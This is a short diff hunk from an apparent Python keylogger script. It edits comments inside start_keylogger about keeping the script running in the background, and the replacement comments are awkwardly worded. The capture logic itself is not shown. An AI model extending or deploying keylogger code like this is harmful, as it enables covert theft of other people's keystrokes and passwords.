@@ -102,9 +102,9 @@ def start_keylogger():
 
     # Keep the script running in the background.
     # keyboard.wait() blocks the main thread until a specific hotkey is pressed,
-    # but since we handle stopping within on_key_event and use a global flag,
-    # we can just use a loop to keep the main thread alive.
-    # Alternatively, for a truly non-blocking main thread, you could run this in a separate thread.
+    # since stopping is handled within on_key_event and uses a global flag,
+    # temporary use a loop to keep the main thread alive is used. Need further feature development.
+    # Alternatively, for a truly non-blocking main thread, the script can be deployed in a seperate thread.
     
     # Simple loop to keep the script alive while logging is active
     while LOGGING_ACTIVE:
